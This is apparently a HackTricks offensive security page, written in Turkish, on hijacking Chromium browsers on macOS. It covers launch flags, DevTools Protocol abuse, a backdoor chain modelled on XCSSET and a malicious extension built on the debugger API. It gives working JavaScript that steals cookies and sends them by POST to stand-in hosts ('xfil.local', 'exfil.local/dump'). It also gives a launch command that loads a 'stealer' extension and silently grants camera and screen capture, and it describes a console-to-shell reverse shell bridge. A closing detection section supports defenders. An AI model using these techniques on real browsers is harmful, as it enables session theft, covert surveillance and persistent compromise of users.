# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi ve Opera gibi Chromium tabanlı browser'ların tümü aynı command-line switch'lerini, preference dosyalarını ve DevTools automation interface'lerini kullanır. macOS'ta GUI erişimi olan herhangi bir user, mevcut bir browser session'ını sonlandırabilir ve target'ın entitlements'larıyla çalışan arbitrary flag'ler, extension'lar veya DevTools endpoint'leriyle yeniden açabilir.

#### macOS'ta Chromium'u custom flag'lerle başlatma

macOS, her Chromium profile'ı için tek bir UI instance'ı tutar; bu nedenle instrumentation normalde browser'ı force-close etmeyi gerektirir (örneğin `osascript -e 'tell application "Google Chrome" to quit'` ile). Attackers genellikle argument'leri app bundle'ı değiştirmeden inject edebilmek için `open -na "Google Chrome" --args <flags>` ile yeniden başlatır. Bu command'i bir user LaunchAgent (`~/Library/LaunchAgents/*.plist`) veya login hook içine sarmak, tampered browser'ın reboot/logoff sonrasında yeniden spawn edilmesini garanti eder.

#### `--load-extension` Flag'i

`--load-extension` flag'i unpacked extension'ları (virgülle ayrılmış path'ler) otomatik olarak yükler. Legitimate extension'ları block ederken yalnızca payload'un çalışmasını zorlamak için bunu `--disable-extensions-except` ile birlikte kullanın. Malicious extension'lar `debugger`, `webRequest` ve `cookies` gibi yüksek etkili permission'lar isteyerek DevTools protocol'lerine pivot edebilir, CSP header'larını patch edebilir, HTTPS'i downgrade edebilir veya browser başlar başlamaz session material'ını exfiltrate edebilir.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flag'leri

Bu switch'ler, external tooling'in browser'ı drive edebilmesi için Chrome DevTools Protocol'ünü (CDP) TCP veya pipe üzerinden expose eder. Google, bu interface'in yaygın infostealer abuse'ını gözlemledi ve Chrome 136'dan (Mart 2025) itibaren browser non-standard bir `--user-data-dir` ile başlatılmadıkça switch'ler default profile için ignore edilir. Bu, gerçek profile'larda App-Bound Encryption'ı enforce eder; ancak attackers hâlâ fresh bir profile spawn edebilir, victim'ı bu profile içinde authenticate olmaya (phishing/triage assistance) zorlayabilir ve CDP üzerinden cookies, tokens, device trust states veya WebAuthn registrations harvest edebilir.

#### `--user-data-dir` Flag'i

Bu flag, tüm browser profile'ını (History, Cookies, Login Data, Preference dosyaları vb.) attacker-controlled bir path'e yönlendirir. Modern Chrome build'lerini `--remote-debugging-port` ile birleştirirken zorunludur ve tampered profile'ı izole tutarak security prompt'larını disable eden, extension'ları auto-install eden ve default scheme'leri değiştiren önceden doldurulmuş `Preferences` veya `Secure Preferences` dosyalarını bırakmanıza da olanak tanır.

#### `--use-fake-ui-for-media-stream` Flag'i

Bu switch, camera/mic permission prompt'unu bypass eder; böylece `getUserMedia` çağıran herhangi bir page anında access alır. Bunu `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` gibi flag'lerle veya CDP `Browser.grantPermissions` command'leriyle birleştirerek audio/video'yu sessizce capture edebilir, desktop'ı share edebilir veya user interaction olmadan WebRTC permission check'lerini karşılayabilirsiniz.

## Gerçek Dünyada Görülen Delivery ve Relaunch Pattern'leri

CDP abuse, initial payload'dan ziyade genellikle bir **post-exploitation** aşamasıdır. Yakın tarihli bir macOS developer-targeting campaign, poisoned bir Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`) kullanarak code'un victim'ın project'i yalnızca **build** etmesiyle execute edilmesini sağladı; victim project'i sadece clone ettiğinde veya açtığında execute olmadı. Bu ilk execution'dan sonra malware, diğer `.xcodeproj` tree'lerini de infect etti, malicious Git `pre-commit` hook'ları ekledi ve daha fazla Xcode project'i için ZIP archive'larını aradı.

Chromium abuse açısından bunun önemi, attacker'ın browser binary'sini patch etmesinin gerekmemesidir. Kısa ömürlü bir build-phase / `osascript` stager bunun yerine her user başlattığında legitimate browser'ı attacker-controlled flag'lerle yeniden açan bir **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher vb.) install edebilir.

> [!TIP]
> Developer endpoint'lerinde `.pbxproj` dosyalarını, `.git/hooks/pre-commit` dosyasını ve beklenmeyen `curl`, `osascript`, `xxd`, nested `base64` veya Chrome relaunch logic içeren `.xcodeproj` dosyalarını barındıran ZIP'leri inceleyin.

## Remote Debugging ve DevTools Protocol Abuse

Chrome dedicated bir `--user-data-dir` ve `--remote-debugging-port` ile yeniden başlatıldıktan sonra CDP üzerinden (örneğin `chrome-remote-interface`, `puppeteer` veya `playwright` aracılığıyla) attach olabilir ve yüksek privilege gerektiren workflow'ları script'leyebilirsiniz:

- **Cookie/session theft:** `Network.getAllCookies` ve `Storage.getCookies`, App-Bound encryption normalde filesystem access'ini block edecek olsa bile HttpOnly değerlerini return eder; çünkü CDP browser'dan çalışan browser'ın bunların decryption işlemini yapmasını ister.
- **Permission tampering:** `Browser.grantPermissions` ve `Emulation.setGeolocationOverride`, camera/mic prompt'larını bypass etmenize (özellikle `--use-fake-ui-for-media-stream` ile birlikte kullanıldığında) veya location-based security check'lerini falsify etmenize olanak tanır.
- **Keystroke/script injection:** `Runtime.evaluate`, active tab içinde arbitrary JavaScript execute ederek credential lifting, DOM patching veya navigation sonrasında hayatta kalan persistence beacon'ları inject etmenizi sağlar.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` ve `Fetch.enable`, disk artifact'larına dokunmadan authenticated request/response'ları real time'da intercept eder.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, victim'ın mevcut `~/Library/Application Support/Google/Chrome` dizinini bir staging path'e copy/paste etmek artık decrypted cookies sağlamaz. Bunun yerine, kullanıcıyı instrumented profile içinde authentication yapmaya social-engineer edin (ör. "yardımcı" support session) veya CDP-controlled network hooks aracılığıyla MFA token'larını transit sırasında capture edin.

### XCSSET-style CDP Backdoor Chain

Pratik bir malware pattern şöyledir:

1. Chrome her başlatıldığında userland implant'ı veya wrapper'ı yeniden başlatın.
2. Meşru browser'ı `--remote-debugging-port=<port>` ile ve Chrome 136+ sürümlerinde genellikle eşleştirilmiş, non-default bir `--user-data-dir=<dir>` ile spawn edin.
3. Local CDP WebSocket'e bağlanan ve `Page.addScriptToEvaluateOnNewDocument` ile bir pre-document hook kaydeden bir helper başlatın.

Bu helper, site kodu çalışmadan **önce** JavaScript inject edebilir. Bu da diskteki dosyaları patch etmeden `window.fetch`, `XMLHttpRequest`, wallet provider'ları veya autofill flow'larını hook'lamak için idealdir.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Daha güçlü bir varyant, browser'ı bir **host command bridge** haline getirir: enjekte edilen JavaScript, delimiter-tagged bir `console.log` üretir; yerel helper `Runtime.consoleAPICalled` olayını izler, marker'ı kaldırır, kalan kısmı host shell üzerinden (örneğin Go'nun `exec.Command` işleviyle) çalıştırır ve stdout/stderr çıktısını saldırganın WebSocket'i üzerinden geri gönderir. Bu, tab düzeyindeki script çalıştırmayı büyük ölçüde fileless reverse shell'e dönüştürür.

## Extension-Based Injection via Debugger API

2023 tarihli "Chrowned by an Extension" araştırması, `chrome.debugger` API'sini kullanan kötü amaçlı bir extension'ın herhangi bir tab'a attach olarak `--remote-debugging-port` ile elde edilen DevTools yetkilerinin aynısına sahip olabileceğini gösterdi. Bu, ilk izolasyon varsayımlarını (extension'ların kendi context'lerinde kalması) bozar ve şunları mümkün kılar:

- `Network.getAllCookies`/`Fetch.getResponseBody` ile sessiz cookie ve credential theft.
- Site permissions'ın (camera, microphone, geolocation) değiştirilmesi ve security interstitial bypass; böylece phishing sayfalarının Chrome dialog'larını taklit etmesine izin verilmesi.
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` veya `Security.handleCertificateError` kullanılarak TLS warnings, downloads veya WebAuthn prompts üzerinde on-path tampering yapılması.

Extension'ı `--load-extension`/`--disable-extensions-except` ile yükleyerek kullanıcı etkileşimi gerekmemesini sağlayın. API'yi weaponize eden minimal bir background script şu şekildedir:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Uzantı ayrıca JavaScript değişkenlerini okumak, inline script'leri patch'lemek veya navigasyondan sonra da geçerli olan özel breakpoint'ler bırakmak için `Debugger.paused` event'lerine subscribe olabilir. Her şey kullanıcının GUI session'ı içinde çalıştığından Gatekeeper ve TCC tetiklenmez; bu da bu tekniği kullanıcı context'i altında zaten execution elde etmiş malware için ideal hale getirir.

## Detection & Hunting

- `--remote-debugging-port`, `--remote-debugging-pipe` veya şüpheli bir `--user-data-dir` ile başlatılan Chromium browser'ları, özellikle parent process `bash`, `sh`, `osascript`, `xcodebuild` veya bir LaunchAgent helper olduğunda alert'leyin.
- Bir helper'ın local CDP WebSocket açtığı, `Page.addScriptToEvaluateOnNewDocument` kaydettiği ve ardından uzun süreli bir outbound WebSocket/HTTPS connection kurduğu kısa zincirleri arayın.
- Browser'ın `Runtime.consoleAPICalled` activity'sini, attacker tarafından sağlanan command'leri çalıştıran child shell'ler veya helper process'lerle ilişkilendirerek console-to-shell bridge'lerini arayın.
- Developer Mac'lerde `.pbxproj` içindeki `PBXShellScriptBuildPhase` entry'lerini, Git `pre-commit` hook'larını, Dock/login item relauncher'larını ve browser wrapper kurulumu için ZIP içinde bulunan Xcode project'lerini inceleyin.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Araçlar

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Chromium başlatmalarını payload extensions ile otomatikleştirir ve etkileşimli CDP hooks sunar.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operatörleri için traffic interception ve browser instrumentation odaklı benzer bir tooling.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Bir `--remote-debugging-port` instance'ı çalışır duruma geldiğinde Chrome DevTools Protocol dumps (cookies, DOM, permissions) üzerinde script yazmak için Node.js library.

### Örnek
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Daha fazla örneği tools bağlantılarında bulabilirsiniz.

## Referanslar

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
